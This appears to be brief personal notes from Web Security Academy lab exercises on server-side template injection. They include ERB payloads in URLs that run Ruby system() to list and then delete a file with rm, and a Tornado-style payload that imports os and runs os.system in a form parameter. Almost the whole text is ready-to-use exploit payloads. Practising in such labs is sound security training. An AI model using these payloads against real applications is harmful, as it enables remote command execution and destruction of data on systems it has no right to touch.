# 1 

check vulnerability : 

	<%= 7 * 7 %>

	https://ac401fee1f46529fc0c043fa00540064.web-security-academy.net/?message=<%= 7 * 7 %>

check system files with ruby command

	https://ac401fee1f46529fc0c043fa00540064.web-security-academy.net/?message=<%= system("ls /home/carlos/morale.txt") %>
	
delete file

	https://ac401fee1f46529fc0c043fa00540064.web-security-academy.net/?message=<%= system("rm /home/carlos/morale.txt") %>
	
# 2 

check is template vulnerable

	}}{{7*7}}

exploit vulnerability

	blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('ls%20/home/carlos/morale.txt')&csrf=JS1JUMr6YJSFQjEYaIgvIJ6dxlmdbYgR